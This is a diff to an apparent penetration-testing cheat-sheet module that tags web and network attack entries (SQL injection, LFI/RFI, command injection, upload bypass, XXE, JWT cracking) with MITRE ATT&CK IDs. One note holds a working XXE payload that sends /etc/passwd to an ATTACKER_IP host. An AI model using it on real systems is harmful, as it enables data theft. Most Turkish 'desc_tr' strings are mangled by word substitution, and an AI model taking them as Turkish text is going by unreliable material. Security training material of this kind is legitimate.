@@ -1758,7 +2075,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate SSL/TLS ciphers and protocols"
+            "desc_tr": "Enumerate SSL/TLS ciphers and protocols",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap SSL Certificate Info",
@@ -1767,7 +2087,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Extract SSL certificate details"
+            "desc_tr": "Extract SSL certificate details",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap SSH Brute Force",
@@ -1776,7 +2099,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SSH NSE üzerinden"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SSH NSE üzerinden",
+            "attack": [
+              "T1110.001",
+              "T1046"
+            ]
           },
           {
             "title": "Nmap FTP Bounce Check",
@@ -1785,7 +2112,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kontrol et: for FTP bounce attack"
+            "desc_tr": "Kontrol et: for FTP bounce attack",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap SMTP Open Relay",
@@ -1794,7 +2124,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kontrol et: for open SMTP relay"
+            "desc_tr": "Kontrol et: for open SMTP relay",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap NFS Enumeration",
@@ -1803,7 +2136,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate NFS exports and permissions"
+            "desc_tr": "Enumerate NFS exports and permissions",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap MySQL Audit",
@@ -1812,7 +2148,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Run MySQL audit and empty password check"
+            "desc_tr": "Run MySQL audit and empty password check",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap LDAP RootDSE",
@@ -1821,7 +2160,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Query LDAP root DSE for domain info"
+            "desc_tr": "Query LDAP root DSE for domain info",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap DNS Brute Force",
@@ -1830,7 +2172,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı DNS subdomains NSE üzerinden"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı DNS subdomains NSE üzerinden",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap vsftpd Backdoor",
@@ -1839,7 +2184,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Test et: vsftpd 2.3.4 backdoor"
+            "desc_tr": "Test et: vsftpd 2.3.4 backdoor",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap SambaCry",
@@ -1848,7 +2196,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Test et: CVE-2017-7494"
+            "desc_tr": "Test et: CVE-2017-7494",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap BlueKeep",
@@ -1857,7 +2208,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Test et: CVE-2019-0708"
+            "desc_tr": "Test et: CVE-2019-0708",
+            "attack": [
+              "T1046",
+              "T1210"
+            ]
           },
           {
             "title": "Nmap IIS Short Names",
@@ -1866,7 +2221,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı IIS short names"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı IIS short names",
+            "attack": [
+              "T1110.001",
+              "T1046"
+            ]
           },
           {
             "title": "Nmap HTTP Config Backup",
@@ -1875,7 +2234,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Find config backups"
+            "desc_tr": "Find config backups",
+            "attack": [
+              "T1046"
+            ]
           }
         ],
         "name_tr": "Network-Level Scanning"
@@ -1929,7 +2291,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Run Nuclei templates matching specific tags"
+            "desc_tr": "Run Nuclei templates matching specific tags",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "Nuclei with Target List",
@@ -1957,7 +2322,10 @@ module.exports = [
               "essential"
             ],
             "note": "Runs nmap, nikto, gobuster etc. automatically",
-            "desc_tr": "Tam automated recon"
+            "desc_tr": "Tam automated recon",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "reconFTW",
@@ -2000,7 +2368,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı WordPress logkimlik bilgileri içinde"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı WordPress logkimlik bilgileri içinde",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "WPScan Enumerate Vulnerable Plugins",
@@ -2091,7 +2462,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı directories and files"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı directories and files",
+            "attack": [
+              "T1110.001",
+              "T1595.003"
+            ]
           },
           {
             "title": "Gobuster with Extensions",
@@ -2101,7 +2476,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı file extensifilter ile üzerinde"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı file extensifilter ile üzerinde",
+            "attack": [
+              "T1110.001",
+              "T1595.003"
+            ]
           },
           {
             "title": "Gobuster DNS Subdomain",
@@ -2110,7 +2489,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı subdomains DNS üzerinden"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı subdomains DNS üzerinden",
+            "attack": [
+              "T1595.003"
+            ]
           },
           {
             "title": "Gobuster VHost Brute Force",
@@ -2119,7 +2501,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı virtual hosts"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı virtual hosts",
+            "attack": [
+              "T1110.001",
+              "T1595.003"
+            ]
           },
           {
             "title": "Gobuster with Cookies",
@@ -2128,7 +2514,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Directory kaba kuvvet saldırısı sessicookie ile üzerinde"
+            "desc_tr": "Directory kaba kuvvet saldırısı sessicookie ile üzerinde",
+            "attack": [
+              "T1110.001",
+              "T1595.003"
+            ]
           },
           {
             "title": "Feroxbuster Recursive",
@@ -2138,7 +2528,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Özyinelemeli directory kaba kuvvet saldırısı"
+            "desc_tr": "Özyinelemeli directory kaba kuvvet saldırısı",
+            "attack": [
+              "T1110.001",
+              "T1595.003"
+            ]
           },
           {
             "title": "Feroxbuster with Depth",
@@ -2147,7 +2541,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Control recursidepth üzerinde"
+            "desc_tr": "Control recursidepth üzerinde",
+            "attack": [
+              "T1595.003"
+            ]
           },
           {
             "title": "FFUF Directory Discovery",
@@ -2157,7 +2554,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Hızlı directory fuzzing/bulanıklaştırma ffuf ile"
+            "desc_tr": "Hızlı directory fuzzing/bulanıklaştırma ffuf ile",
+            "attack": [
+              "T1595.003"
+            ]
           },
           {
             "title": "FFUF with Dirb Common",
@@ -2167,7 +2567,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Hızlı directory tarama dirb commkelime listesi ile üzerinde"
+            "desc_tr": "Hızlı directory tarama dirb commkelime listesi ile üzerinde",
+            "attack": [
+              "T1595.003"
+            ]
           },
           {
             "title": "FFUF with Status Code Filter",
@@ -2177,7 +2580,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Directory fuzzing/bulanıklaştırma filtering out 403/404 responses"
+            "desc_tr": "Directory fuzzing/bulanıklaştırma filtering out 403/404 responses",
+            "attack": [
+              "T1595.003"
+            ]
           },
           {
             "title": "FFUF VHost Discovery",
@@ -2186,7 +2592,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Virtual aktif host keşfi ffuf ile"
+            "desc_tr": "Virtual aktif host keşfi ffuf ile",
+            "attack": [
+              "T1595.003"
+            ]
           },
           {
             "title": "FFUF Extension Fuzzing",
@@ -2195,7 +2604,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Fuzz for files belirli extensions ile"
+            "desc_tr": "Fuzz for files belirli extensions ile",
+            "attack": [
+              "T1595.003"
+            ]
           },
           {
             "title": "Dirsearch Standard",
@@ -2213,7 +2625,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Web content kaba kuvvet saldırısı dirb ile"
+            "desc_tr": "Web content kaba kuvvet saldırısı dirb ile",
+            "attack": [
+              "T1110.001",
+              "T1595.003"
+            ]
           },
           {
             "title": "Wfuzz Directory Discovery",
@@ -2222,7 +2638,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Directory fuzzing/bulanıklaştırma wfuzz ile"
+            "desc_tr": "Directory fuzzing/bulanıklaştırma wfuzz ile",
+            "attack": [
+              "T1595.003"
+            ]
           }
         ],
         "name_tr": "Path & Content Discovery"
@@ -2238,7 +2657,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Discover hidden GET parameters"
+            "desc_tr": "Discover hidden GET parameters",
+            "attack": [
+              "T1595.003"
+            ]
           },
           {
             "title": "FFUF POST Parameter Fuzzing",
@@ -2248,7 +2670,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Discover hidden POST parameters"
+            "desc_tr": "Discover hidden POST parameters",
+            "attack": [
+              "T1595.003"
+            ]
           },
           {
             "title": "FFUF Value Fuzzing",
@@ -2257,7 +2682,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Parametre değerlerini fuzz'la"
+            "desc_tr": "Parametre değerlerini fuzz'la",
+            "attack": [
+              "T1595.003"
+            ]
           },
           {
             "title": "Wfuzz POST Parameter Fuzz",
@@ -2266,7 +2694,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Fuzz POST data wfuzz ile"
+            "desc_tr": "Fuzz POST data wfuzz ile",
+            "attack": [
+              "T1595.003"
+            ]
           },
           {
             "title": "FFUF Recursive Fuzzing",
@@ -2275,7 +2706,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Özyinelemeli directory fuzzing/bulanıklaştırma filters ile"
+            "desc_tr": "Özyinelemeli directory fuzzing/bulanıklaştırma filters ile",
+            "attack": [
+              "T1595.003"
+            ]
           },
           {
             "title": "FFUF with Cookie Auth",
@@ -2284,7 +2718,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Fuzz authenticated sessiile üzerinde"
+            "desc_tr": "Fuzz authenticated sessiile üzerinde",
+            "attack": [
+              "T1595.003"
+            ]
           }
         ],
         "name_tr": "Parameter Discovery & Fuzzing"
@@ -2299,7 +2736,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Basic directory traversal read /etc/passwd'e"
+            "desc_tr": "Basic directory traversal read /etc/passwd'e",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "LFI Null Byte Bypass",
@@ -2309,7 +2749,10 @@ module.exports = [
               "essential"
             ],
             "note": "Works on PHP < 5.3.4",
-            "desc_tr": "Null byte bypass extensiappending (PHP <5.3) üzerinde'e"
+            "desc_tr": "Null byte bypass extensiappending (PHP <5.3) üzerinde'e",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "LFI Double Encoding",
@@ -2318,7 +2761,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Double URL-kodlama traversal characters"
+            "desc_tr": "Double URL-kodlama traversal characters",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "LFI PHP Base64 Wrapper",
@@ -2327,7 +2773,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Read PHP source code via base64 wrapper"
+            "desc_tr": "Read PHP source code via base64 wrapper",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "LFI PHP Input Wrapper",
@@ -2336,7 +2785,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Execute PHP code via input wrapper"
+            "desc_tr": "Execute PHP code via input wrapper",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "LFI Data Wrapper",
@@ -2345,7 +2797,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Execute PHP via data:// wrapper"
+            "desc_tr": "Execute PHP via data:// wrapper",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "LFI Expect Wrapper",
@@ -2355,7 +2810,10 @@ module.exports = [
               "advanced"
             ],
             "note": "Requires expect module enabled",
-            "desc_tr": "Execute commands via expect wrapper"
+            "desc_tr": "Execute commands via expect wrapper",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "LFI Log Poisoning (Apache)",
@@ -2368,7 +2826,10 @@ module.exports = [
               "advanced"
             ],
             "note": "Log path varies: /var/log/apache2/access.log, /var/log/httpd/access_log",
-            "desc_tr": "PoisApache access log then include it üzerinde"
+            "desc_tr": "PoisApache access log then include it üzerinde",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "LFI Log Poisoning (SSH)",
@@ -2380,7 +2841,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Poisauth.log SSH then include it üzerinden üzerinde"
+            "desc_tr": "Poisauth.log SSH then include it üzerinden üzerinde",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "LFI /proc/self/environ",
@@ -2389,7 +2853,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Include process ortam değişkenleri"
+            "desc_tr": "Include process ortam değişkenleri",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "LFI Common Linux Files",
@@ -2404,7 +2871,13 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Important files check LFI Linux üzerinden üzerinde'e"
+            "desc_tr": "Important files check LFI Linux üzerinden üzerinde'e",
+            "attack": [
+              "T1003.008",
+              "T1552.001",
+              "T1053.003",
+              "T1190"
+            ]
           },
           {
             "title": "LFI Common Windows Files",
@@ -2417,7 +2890,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Important files check LFI Windows üzerinden üzerinde'e"
+            "desc_tr": "Important files check LFI Windows üzerinden üzerinde'e",
+            "attack": [
+              "T1190"
+            ]
           }
         ],
         "name_tr": "Local File Inclusion"
@@ -2433,7 +2909,11 @@ module.exports = [
               "essential"
             ],
             "note": "Requires allow_url_include=On in PHP",
-            "desc_tr": "Include a uzak PHP shell"
+            "desc_tr": "Include a uzak PHP shell",
+            "attack": [
+              "T1505.003",
+              "T1190"
+            ]
           },
           {
             "title": "RFI with Null Byte",
@@ -2442,7 +2922,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "RFI null byte bypass extensiappending ile üzerinde'e"
+            "desc_tr": "RFI null byte bypass extensiappending ile üzerinde'e",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "RFI SMB Share (Windows)",
@@ -2451,7 +2934,11 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Include file attacker SMB share Windows target üzerinden üzerinde"
+            "desc_tr": "Include file attacker SMB share Windows target üzerinden üzerinde",
+            "attack": [
+              "T1505.003",
+              "T1190"
+            ]
           },
           {
             "title": "Host RFI Payload",
@@ -2460,7 +2947,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Start a web server to host RFI payloads"
+            "desc_tr": "Start a web server to host RFI payloads",
+            "attack": [
+              "T1190"
+            ]
           }
         ],
         "name_tr": "Remote File Inclusion"
@@ -2475,7 +2965,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enjekte et: command semicolseparator kullanarak üzerinde"
+            "desc_tr": "Enjekte et: command semicolseparator kullanarak üzerinde",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "Command Injection Pipe",
@@ -2484,7 +2977,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enjekte et: command pipe operator kullanarak"
+            "desc_tr": "Enjekte et: command pipe operator kullanarak",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "Command Injection OR",
@@ -2493,7 +2989,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enjekte et: logical OR kullanarak"
+            "desc_tr": "Enjekte et: logical OR kullanarak",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "Command Injection AND",
@@ -2502,7 +3001,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enjekte et: logical AND kullanarak"
+            "desc_tr": "Enjekte et: logical AND kullanarak",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "Command Injection Substitution",
@@ -2511,7 +3013,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enjekte et: command substitutiüzerinden üzerinde"
+            "desc_tr": "Enjekte et: command substitutiüzerinden üzerinde",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "Command Injection Backticks",
@@ -2520,7 +3025,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enjekte et: backtick substitutiüzerinden üzerinde"
+            "desc_tr": "Enjekte et: backtick substitutiüzerinden üzerinde",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "Command Injection Newline",
@@ -2529,7 +3037,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Enjekte et: command URL-encoded newline ile"
+            "desc_tr": "Enjekte et: command URL-encoded newline ile",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "Blind Command Injection (Time)",
@@ -2538,7 +3049,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Detect blind injection with sleep delay"
+            "desc_tr": "Detect blind injection with sleep delay",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "Blind Command Injection (OOB)",
@@ -2550,7 +3064,12 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Detect blind injection via out-of-band DNS/HTTP"
+            "desc_tr": "Detect blind injection via out-of-band DNS/HTTP",
+            "attack": [
+              "T1033",
+              "T1590.002",
+              "T1190"
+            ]
           },
           {
             "title": "Command Injection Rev Shell",
@@ -2559,7 +3078,11 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Enjekte et: a ters bağlantı kabuğu command"
+            "desc_tr": "Enjekte et: a ters bağlantı kabuğu command",
+            "attack": [
+              "T1059.004",
+              "T1190"
+            ]
           }
         ],
         "name_tr": "OS Command Injection"
@@ -2574,7 +3097,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Upload a basic PHP web shell"
+            "desc_tr": "Upload a basic PHP web shell",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "Upload Double Extension Bypass",
@@ -2583,7 +3109,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Bypass extension filter with double extension"
+            "desc_tr": "Bypass extension filter with double extension",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "Upload Content-Type Bypass",
@@ -2592,7 +3121,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Bypass content-type validation"
+            "desc_tr": "Bypass content-type validation",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "Upload .htaccess Override",
@@ -2615,7 +3147,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Bypass with case-altered extension"
+            "desc_tr": "Bypass with case-altered extension",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "Upload Alternate PHP Extensions",
@@ -2629,7 +3164,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Alternatif PHP uzantılarını dene"
+            "desc_tr": "Alternatif PHP uzantılarını dene",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "Upload Magic Bytes Bypass",
@@ -2638,7 +3176,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Prepend magic bytes bypass file type check'e"
+            "desc_tr": "Prepend magic bytes bypass file type check'e",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "Upload Null Byte (Legacy)",
@@ -2647,7 +3188,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Null byte filename bypass filters'e içinde"
+            "desc_tr": "Null byte filename bypass filters'e içinde",
+            "attack": [
+              "T1505.003"
+            ]
           }
         ],
         "name_tr": "Unrestricted File Upload"
@@ -2796,7 +3340,10 @@ module.exports = [
               "advanced"
             ],
             "note": "xxe.dtd: <!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"http://<ATTACKER_IP>/?data=%file;\">'>%eval;%exfil;",
-            "desc_tr": "Out-of-band veri sızdırma XXE üzerinden"
+            "desc_tr": "Out-of-band veri sızdırma XXE üzerinden",
+            "attack": [
+              "T1048"
+            ]
           },
           {
             "title": "XXE Billion Laughs (DoS)",
@@ -2821,7 +3368,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Exfiltrate data out-of-band external DTD üzerinden"
+            "desc_tr": "Exfiltrate data out-of-band external DTD üzerinden",
+            "attack": [
+              "T1048"
+            ]
           },
           {
             "title": "Blind XXE Error-Based",
@@ -2831,7 +3381,10 @@ module.exports = [
               "advanced"
             ],
             "note": "Data appears in error message",
-            "desc_tr": "Exfiltrate data XML parsing errors üzerinden"
+            "desc_tr": "Exfiltrate data XML parsing errors üzerinden",
+            "attack": [
+              "T1048"
+            ]
           },
           {
             "title": "XXE via SVG Upload",
@@ -2855,7 +3408,10 @@ module.exports = [
               "advanced"
             ],
             "note": "DOCX/XLSX are ZIP archives containing XML files",
-            "desc_tr": "Enjekte et: XXE inOffice Open XML files'e"
+            "desc_tr": "Enjekte et: XXE inOffice Open XML files'e",
+            "attack": [
+              "T1560"
+            ]
           },
           {
             "title": "XXE via SOAP Request",
@@ -2926,7 +3482,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Generate malicious Python pickle payload"
+            "desc_tr": "Generate malicious Python pickle payload",
+            "attack": [
+              "T1059.006"
+            ]
           },
           {
             "title": ".NET Ysoserial Payload",
@@ -3196,7 +3755,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Crack JWT HMAC secret with hashcat"
+            "desc_tr": "Crack JWT HMAC secret with hashcat",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "JWT Weak Secret Crack (john)",
@@ -3205,7 +3767,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Crack JWT HMAC secret with john"
+            "desc_tr": "Crack JWT HMAC secret with john",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "JWT Algorithm Confusion (RS256 to HS256)",
@@ -3239,7 +3804,10 @@ module.exports = [
               "advanced"
             ],
             "note": "kid parameter may be used to read arbitrary files as signing key",
-            "desc_tr": "İstismar et: r kid header parameter for key enjeksiyon"
+            "desc_tr": "İstismar et: r kid header parameter for key enjeksiyon",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "JWT Decode",
@@ -3269,7 +3837,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı HMAC secret"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı HMAC secret",
+            "attack": [
+              "T1110.002"
+            ]
           },
           {
             "title": "JWT Algorithm Confusion",
@@ -3368,7 +3939,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Send SQLi payload WebSocket üzerinden"
+            "desc_tr": "Send SQLi payload WebSocket üzerinden",
+            "attack": [
+              "T1190"
+            ]
           }
         ],
         "name_tr": "CORS & HTTP Smuggling"
@@ -3526,7 +4100,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Test et: for SQL enjeksiysingle quote ile üzerinde"
+            "desc_tr": "Test et: for SQL enjeksiysingle quote ile üzerinde",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLi Double Quote Test",
@@ -3535,7 +4112,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Test et: for SQL enjeksiydouble quote ile üzerinde"
+            "desc_tr": "Test et: for SQL enjeksiydouble quote ile üzerinde",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLi OR True Test",
@@ -3628,7 +4208,10 @@ module.exports = [
               "essential"
             ],
             "note": "Adjust number of columns to match ORDER BY result",
-            "desc_tr": "Find number of columns and visible positions"
+            "desc_tr": "Find number of columns and visible positions",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "MySQL Version via UNION",
@@ -3637,7 +4220,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Extract MySQL version"
+            "desc_tr": "Extract MySQL version",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "MySQL Current User via UNION",
@@ -3646,7 +4232,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Extract current database user"
+            "desc_tr": "Extract current database user",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "MySQL Current Database",
@@ -3655,7 +4244,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Extract current database name"
+            "desc_tr": "Extract current database name",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "MySQL List Databases",
@@ -3664,7 +4256,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate all databases"
+            "desc_tr": "Enumerate all databases",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "MySQL List Tables",
@@ -3673,7 +4268,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate tables in a database"
+            "desc_tr": "Enumerate tables in a database",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "MySQL List Columns",
@@ -3682,7 +4280,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate columns in a table"
+            "desc_tr": "Enumerate columns in a table",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "MySQL Dump Data",
@@ -3691,7 +4292,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Extract data from specific columns"
+            "desc_tr": "Extract data from specific columns",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "MySQL Read File",
@@ -3700,7 +4304,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Read file from filesystem via SQL"
+            "desc_tr": "Read file from filesystem via SQL",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "MySQL Write File",
@@ -3709,7 +4316,11 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Write a web shell via SQL injection"
+            "desc_tr": "Write a web shell via SQL injection",
+            "attack": [
+              "T1190",
+              "T1505.003"
+            ]
           },
           {
             "title": "MSSQL Version via UNION",
@@ -3718,7 +4329,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Extract MSSQL version"
+            "desc_tr": "Extract MSSQL version",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "MSSQL List Databases",
@@ -3727,7 +4341,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate MSSQL databases"
+            "desc_tr": "Enumerate MSSQL databases",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "MSSQL List Tables",
@@ -3736,7 +4353,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate MSSQL tables"
+            "desc_tr": "Enumerate MSSQL tables",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "PostgreSQL Version via UNION",
@@ -3745,7 +4365,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Extract PostgreSQL version"
+            "desc_tr": "Extract PostgreSQL version",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "PostgreSQL List Databases",
@@ -3754,7 +4377,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate PostgreSQL databases"
+            "desc_tr": "Enumerate PostgreSQL databases",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "PostgreSQL List Tables",
@@ -3763,7 +4389,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate PostgreSQL tables"
+            "desc_tr": "Enumerate PostgreSQL tables",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLite Version via UNION",
@@ -3772,7 +4401,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Extract SQLite version"
+            "desc_tr": "Extract SQLite version",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLite List Tables",
